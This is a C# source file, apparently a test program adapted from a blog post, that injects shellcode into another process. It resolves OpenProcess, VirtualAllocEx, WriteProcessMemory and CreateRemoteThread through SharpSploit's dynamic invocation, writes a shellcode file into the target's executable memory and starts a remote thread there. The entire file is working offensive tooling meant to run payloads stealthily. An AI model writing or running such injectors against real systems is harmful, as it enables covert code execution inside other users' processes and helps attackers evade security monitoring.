// stolen from https://rastamouse.me/blog/process-injection-dinvoke/
using System;
using System.IO;
using System.Runtime.InteropServices;

using SharpSploit.Execution.DynamicInvoke;

namespace InjectionTest
{
    class Program
    {
        static void Main(string[] args)
        {
            var shellcode = File.ReadAllBytes(args[0]);

            var pointer = Generic.GetLibraryAddress("kernel32.dll", "OpenProcess");
            var openProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(OpenProcess)) as OpenProcess;
            var hProcess = openProcess(0x001F0FFF, false, int.Parse(args[1]));

            pointer = Generic.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
            var virtualAllocEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(VirtualAllocEx)) as VirtualAllocEx;
            var alloc = virtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);

            pointer = Generic.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
            var writeProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(WriteProcessMemory)) as WriteProcessMemory;
            writeProcessMemory(hProcess, alloc, shellcode, (uint)shellcode.Length, out UIntPtr bytesWritten);

            pointer = Generic.GetLibraryAddress("kernel32.dll", "CreateRemoteThread");
            var createRemoteThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(CreateRemoteThread)) as CreateRemoteThread;
            createRemoteThread(hProcess, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    }
}
